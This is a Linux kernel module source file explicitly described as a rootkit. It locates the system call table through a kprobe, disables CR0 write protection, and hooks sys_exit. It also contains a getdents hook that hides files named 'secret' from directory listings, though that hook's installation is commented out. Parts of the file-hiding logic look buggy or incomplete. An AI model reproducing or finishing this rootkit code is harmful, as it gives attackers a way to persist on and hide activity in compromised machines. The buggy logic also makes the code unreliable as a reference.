#include <linux/init.h>
#include <linux/unistd.h>
#include <linux/module.h>
#include <linux/kernel.h>

#include <linux/kallsyms.h>
#include <linux/syscalls.h>
#include <linux/sched.h>
#include <linux/cred.h>
#include <linux/uidgid.h>
#include <linux/file.h>
#include <linux/kmod.h>
#include <linux/umh.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/buffer_head.h>
#include <linux/kprobes.h>

#include <asm/uaccess.h>
#include <asm/segment.h>

MODULE_AUTHOR("Parth Thakkar");
MODULE_DESCRIPTION("Rootkit");
MODULE_LICENSE("GPL");


#define KERNEL_VERSION_SHOULD_BE KERNEL_VERSION(5,0,0)
#define HIDE_FILE "secret"



// struct linux_dirent {
//                unsigned long  d_ino;     /* Inode number */
//                unsigned long  d_off;     /* Not an offset; see below */
//                unsigned short d_reclen;  /* Length of this linux_dirent */
//                char           d_name[];  /* Filename (null-terminated) */
//                                  /* length is actually (d_reclen - 2 -
//                                     offsetof(struct linux_dirent, d_name)) */
//                /*
//                char           pad;       // Zero padding byte
//                char           d_type;    // File type (only since Linux
//                                          // 2.6.4); offset is (d_reclen - 1)
//                */
//            }



static struct linux_dirent {
	unsigned long	d_ino;
	unsigned long	d_off;
	unsigned short	d_reclen;
	char		d_name[];
};



static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};

asmlinkage long (*original_getdents64)(int fd, struct linux_dirent64 * dirp, unsigned int count);
asmlinkage long (*original_getdents)(int fd, struct linux_dirent * dirp, unsigned int count);
asmlinkage int (*original_sys_exit)(int);

uint8_t was_writable = 0;
void **sys_call_table_addr = (void *)0xffffffff88400280;

#define CR0_WRITE_UNLOCK(x)                       \
    do                                            \
    {                                             \
        unsigned long __cr0;                      \
        preempt_disable();                        \
        __cr0 = read_cr0() & (~X86_CR0_WP);       \
        BUG_ON(unlikely((__cr0 & X86_CR0_WP)));   \
        write_cr0(__cr0);                         \
        x;                                        \
        __cr0 = read_cr0() | X86_CR0_WP;          \
        BUG_ON(unlikely(!(__cr0 && X86_CR0_WP))); \
        write_cr0(__cr0);                         \
        preempt_enable();                         \
    } while (0)




asmlinkage int custom_sys_exit(int error_no){
    printk("HEY! sys_exit called with error_code=%d\n", error_no);
    /*call the original sys_exit*/
    return original_sys_exit(error_no);
}


asmlinkage long fake_getdents64(int fd, struct linux_dirent64 * dirp, unsigned int count) {
    printk("Fake getdents64 called \n");
    
    return original_getdents64(fd, dirp, count);
}

asmlinkage long fake_getdents(int fd, struct linux_dirent * original_dir_entry, unsigned int count) {
    printk("Fake getdents called \n");
    struct linux_dirent *rootkit_dir_entry_structure;
    // the output of getdents is the number of bytes read
    long nbytes = (typeof(fake_getdents64)*)(original_getdents)(fd, original_dir_entry, count);
    

//     kmalloc can be used in interrupt context with appropriate flags.
// vmalloc cannot be used in interrupt context as it may sleep.
// kvmalloc behavior depends on the flags and the actual allocation method used

// Memory allocated by vmalloc and sometimes kvmalloc is visible in /proc/vmallocinfo, which can be useful for debugging.
// kmalloc allocations are typically not directly visible in proc files but can be tracked using kernel memory debugging tools.

// Provides a flexible allocation strategy combining kmalloc and vmalloc.
    rootkit_dir_entry_structure = kvmalloc(nbytes, GFP_KERNEL);
	if (rootkit_dir_entry_structure == NULL) {
		pr_info("fake dents allocation error");
        // used when memory is allocated with kvmalloc;
		kvfree( rootkit_dir_entry_structure );
		return -1;
	}
    copy_from_user(rootkit_dir_entry_structure, original_dir_entry, nbytes);


    long offset = 0;
    struct linux_dirent *current_rootkit_dir_entry, *prev_dir_entry;
    unsigned short current_dir_record_lenth;
    while(offset < nbytes){
        // converting to void * is important as we need just byte addressable array
        current_rootkit_dir_entry = (void *)rootkit_dir_entry_structure + offset;
        current_dir_record_lenth = current_rootkit_dir_entry->d_reclen;

        // check if name is matching
        if(strstr(current_rootkit_dir_entry->d_name, HIDE_FILE) != NULL){
            if(current_dir_record_lenth == rootkit_dir_entry_structure){
                // match at first entry; then there is not previous entry to "absrob" it.
                nbytes -= current_dir_record_lenth;
                // so we move the memory by the lenght of current entry.
                memmove(rootkit_dir_entry_structure, (void *)rootkit_dir_entry_structure, nbytes);
            }
            printk(KERN_INFO "hiding %s", current_rootkit_dir_entry->d_name);
            // basically we are moving two times when reading previous entry
            // , one own record lenght and other current record length
            prev_dir_entry->d_reclen += current_dir_record_lenth;
        }
        else{
            // if no match then  previous would be current
            prev_dir_entry = current_rootkit_dir_entry;
        }
        offset += current_dir_record_lenth;
    }
    copy_to_user(original_dir_entry, rootkit_dir_entry_structure, nbytes);
    kvfree(rootkit_dir_entry_structure);
    return nbytes;
}



static int __init custom_init(void)
{
    int ret = 0;
    printk(KERN_INFO "Init\n");

    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name_my;
    register_kprobe(&kp);
    kallsyms_lookup_name_my = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
    sys_call_table_addr = (void *)kallsyms_lookup_name_my("sys_call_table");
    if (sys_call_table_addr == NULL)
    {
        pr_info("sys_call_table not found using kprobe my kallsyms\n");
        return -1;
    }
    printk(KERN_INFO "sys_call_table pointer from kprobe is %p\n", sys_call_table_addr);

    
    
    original_sys_exit = sys_call_table_addr[__NR_exit];
    CR0_WRITE_UNLOCK({
        sys_call_table_addr[__NR_exit] = (unsigned long)custom_sys_exit;
    });

    // original_getdents = sys_call_table_addr[__NR_getdents];
    // CR0_WRITE_UNLOCK({
    //     sys_call_table_addr[__NR_getdents] = (unsigned long)fake_getdents;
    // });

    // original_getdents64 = sys_call_table_addr[__NR_getdents64];
    // CR0_WRITE_UNLOCK({
    //     sys_call_table_addr[__NR_getdents64] = (unsigned long)fake_getdents64;
    // });


    return ret;
}


static void __exit custom_exit(void){
    // sys_call_table[__NR_exit] = original_sys_exit;

    CR0_WRITE_UNLOCK({
                sys_call_table_addr[__NR_exit] = (unsigned long)original_sys_exit;;
            });
    // CR0_WRITE_UNLOCK({
    //             sys_call_table_addr[__NR_getdents] = (unsigned long)original_getdents;;
    //         });
    // CR0_WRITE_UNLOCK({
    //             sys_call_table_addr[__NR_getdents64] = (unsigned long)original_getdents64;;
    //         });

    printk(KERN_INFO "Noooooo..... my interception ,,,,,  exiting....\n");
}


module_init(custom_init);
module_exit(custom_exit);



